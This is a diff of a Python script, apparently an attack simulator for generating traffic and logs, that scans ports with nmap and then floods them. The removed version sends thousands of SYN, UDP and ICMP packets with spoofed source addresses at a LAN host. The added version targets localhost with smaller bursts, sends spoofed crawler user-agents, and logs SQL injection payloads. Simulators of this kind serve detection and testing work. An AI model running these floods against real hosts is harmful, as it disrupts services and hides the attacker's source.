@@ -1,136 +1,127 @@
-import threading
-import time
-import pandas as pd
-import os
-import subprocess
 import logging
-from scapy.all import IP, TCP, UDP, ICMP, send, sendp, RandIP
-from faker import Faker
-from concurrent.futures import ThreadPoolExecutor
-import platform
+import time
+import nmap
+import csv
+import random
+import os
+import argparse
+import requests
+from scapy.all import IP, TCP, UDP, send
 
-if platform.system() == "Windows":
-    NMAP_PATH = r"C:\Program Files (x86)\Nmap\nmap.exe"
-else:
-    NMAP_PATH = "nmap"  # Use system nmap on macOS/Linux
+LOG_TXT = "attack_logs.txt"
+LOG_CSV = "attack_logs.csv"
+TARGET_IP = "127.0.0.1"  # Keep this local for safe testing
+PACKET_COUNT = 50
 
-target_ip = "192.168.101.159"
-faker = Faker()
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
-LOG_FILE = "attack_logs.txt"
+def ensure_csv_header():
+    if not os.path.exists(LOG_CSV) or os.path.getsize(LOG_CSV) == 0:
+        with open(LOG_CSV, "w", newline="") as csvfile:
+            writer = csv.writer(csvfile)
+            writer.writerow(["Timestamp", "Attack Type", "Target IP", "Target Port", "Status"])
 
-def setup_logger():
-    logging.basicConfig(
-        filename=LOG_FILE,
-        level=logging.INFO,
-        format="%(asctime)s - %(levelname)s - %(message)s",
-        datefmt="%Y-%m-%d %H:%M:%S"
-    )
+def log_attack(attack_type, ip, port=None, status="Launched"):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    port_str = f":{port}" if port else ""
+    log_msg = f"{timestamp} - {attack_type} Attack on {ip}{port_str}"
+    
+    logging.info(log_msg)
+    with open(LOG_TXT, "a") as f:
+        f.write(log_msg + "\n")
+    with open(LOG_CSV, "a", newline="") as csvfile:
+        writer = csv.writer(csvfile)
+        writer.writerow([timestamp, attack_type, ip, port or "-", status])
 
-setup_logger()
-logging.info("Attack Simulator Started.")
+def syn_flood(target_ip, target_port):
+    log_attack("SYN Flood", target_ip, target_port)
+    for _ in range(PACKET_COUNT):
+        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
+        send(packet, verbose=False)
 
-def check_nmap():
-    try:
-        result = subprocess.run([NMAP_PATH, "--version"], capture_output=True, text=True, check=True)
-        print(result.stdout)
-        return True
-    except FileNotFoundError:
-        logging.error(f"[ERROR] Nmap not found at {NMAP_PATH}. Please install it.")
-        return False
+def udp_flood(target_ip, target_port):
+    log_attack("UDP Flood", target_ip, target_port)
+    for _ in range(PACKET_COUNT):
+        packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * random.randint(20, 100))
+        send(packet, verbose=False)
 
-def get_open_ports(target):
-    logging.info(f"Scanning open ports on {target}...")
-    ports = []
-    try:
-        result = subprocess.run([NMAP_PATH, "-p", "1-65535", target], capture_output=True, text=True, check=True)
-        lines = result.stdout.split("\n")
-        for line in lines:
-            if "/tcp" in line and "open" in line:
-                port = int(line.split("/")[0])
-                ports.append(port)
-        logging.info(f"Found open ports: {ports}")
-        return ports
-    except Exception as e:
-        logging.error(f"[ERROR] Nmap scanning failed: {e}")
-        return []
-
-if not check_nmap():
-    exit()
-
-open_ports = get_open_ports(target_ip)
-if not open_ports:
-    logging.info("[INFO] No open ports found. Please check your target IP manually.")
-    exit()
-
-def syn_flood(port):
-    logging.info(f"Starting SYN Flood Attack on port {port}...")
-    try:
-        for _ in range(10000):  
-            packet = IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S")
-            send(packet, verbose=False)
-        logging.info(f"[SUCCESS] SYN Flood Attack on port {port} completed!")
-    except Exception as e:
-        logging.error(f"[ERROR] SYN Flood Attack failed: {e}")
-
-def udp_flood(port):
-    logging.info(f"Starting UDP Flood Attack on port {port}...")
-    try:
-        for _ in range(10000):  
-            packet = IP(dst=target_ip, src=RandIP()) / UDP(dport=port) / (b"\x00" * 512)  # Large packet
-            send(packet, verbose=False)
-        logging.info(f"[SUCCESS] UDP Flood Attack on port {port} completed!")
-    except Exception as e:
-        logging.error(f"[ERROR] UDP Flood Attack failed: {e}")
-
-def slowloris(port):
-    logging.info(f"Starting Slowloris Attack on port {port}...")
-    try:
-        for _ in range(5000):  
-            send(IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S"), verbose=False)
-            time.sleep(0.1)  
-        logging.info(f"[SUCCESS] Slowloris Attack on port {port} completed!")
-    except Exception as e:
-        logging.error(f"[ERROR] Slowloris Attack failed: {e}")
-
-def icmp_flood():
-    logging.info("Starting ICMP (Ping) Flood Attack...")
-    try:
-        for _ in range(5000):  
-            packet = IP(dst=target_ip, src=RandIP()) / ICMP()
-            send(packet, verbose=False)
-        logging.info("[SUCCESS] ICMP Flood Attack completed!")
-    except Exception as e:
-        logging.error(f"[ERROR] ICMP Flood Attack failed: {e}")
-
-def sql_injection():
-    logging.info("Generating SQL Injection Logs...")
-    try:
-        sql_samples = ["' OR '1'='1' --", "' UNION SELECT username, password FROM users --"]
-        df = pd.DataFrame({"Attack Type": ["SQL Injection"] * len(sql_samples), "Payload": sql_samples})
-        df.to_csv("sql_injection_logs.csv", index=False)
-        logging.info("[SUCCESS] SQL Injection Logs generated!")
-    except Exception as e:
-        logging.error(f"[ERROR] SQL Injection log generation failed: {e}")
+def slowloris_attack(target_ip, target_port):
+    log_attack("Slowloris", target_ip, target_port)
+    for _ in range(10):
+        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
+        send(packet, verbose=False)
 
 def fake_bot_traffic():
-    logging.info("Generating Fake Bot Traffic...")
+    log_attack("Fake Bot Traffic", TARGET_IP)
+    headers = {
+        "User-Agent": random.choice([
+            "Googlebot/2.1 (+http://www.google.com/bot.html)",
+            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+            "Mozilla/5.0 (Linux; Android 11)",
+        ])
+    }
     try:
-        data = [{"IP": faker.ipv4(), "Attack_Type": "Bot Traffic", "Payload": faker.sentence()} for _ in range(500)]
-        df = pd.DataFrame(data)
-        df.to_csv("fake_bot_traffic.csv", index=False)
-        logging.info("[SUCCESS] Fake Bot Traffic generated!")
+        for _ in range(5):
+            requests.get("http://127.0.0.1", headers=headers, timeout=1)
+    except:
+        pass  # Intentionally ignore timeouts
+    logging.info("Fake Bot Traffic simulated with spoofed User-Agents.")
+
+def sql_injection_simulation():
+    payloads = ["' OR 1=1 --", "admin' --", "' OR 'a'='a"]
+    for payload in payloads:
+        log_attack("SQL Injection", TARGET_IP, status=f"Payload={payload}")
+        logging.info(f"SQL Injection Attempt: payload={payload}")
+        time.sleep(1)
+
+def scan_and_attack(target=TARGET_IP):
+    logging.info("🚨 Attack Simulation Starting")
+    ensure_csv_header()
+
+    sql_injection_simulation()
+    fake_bot_traffic()
+
+    logging.info(f"Scanning open ports on {target}...")
+    try:
+        nm = nmap.PortScanner()
+        nm.scan(hosts=target, arguments="-p 1-1024 --open")
     except Exception as e:
-        logging.error(f"[ERROR] Fake Bot Traffic generation failed: {e}")
+        logging.warning(f"Port scan failed: {e}")
+        return
 
-with ThreadPoolExecutor(max_workers=10) as executor:
+    open_ports = []
+    if target in nm.all_hosts():
+        for proto in nm[target].all_protocols():
+            open_ports.extend(nm[target][proto].keys())
+    else:
+        logging.warning(f"Could not detect target {target}. Skipping attack.")
+        return
+
+    if not open_ports:
+        logging.warning("No open ports found. Skipping port-based attacks.")
+        return
+
+    logging.info(f"🎯 Target Ports: {open_ports}")
     for port in open_ports:
-        executor.submit(syn_flood, port)
-        executor.submit(udp_flood, port)  
-        executor.submit(slowloris, port)
+        syn_flood(target, port)
+        time.sleep(1)
+        udp_flood(target, port)
+        time.sleep(1)
+        slowloris_attack(target, port)
+        time.sleep(1)
+        fake_bot_traffic()
 
-    executor.submit(icmp_flood)  
-    executor.submit(sql_injection)
-    executor.submit(fake_bot_traffic)
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--loop", action="store_true", help="Continuously run attacks in a loop")
+    args = parser.parse_args()
 
-print("[INFO] All attacks completed!")
+    while True:
+        try:
+            scan_and_attack()
+        except Exception as e:
+            logging.error(f"[Attack Simulator] Error occurred: {e}", exc_info=True)
+            print(f"[Attack Simulator] Error occurred: {e}. Continuing...")
+        if not args.loop:
+            break
+        time.sleep(60)  # Delay before next round
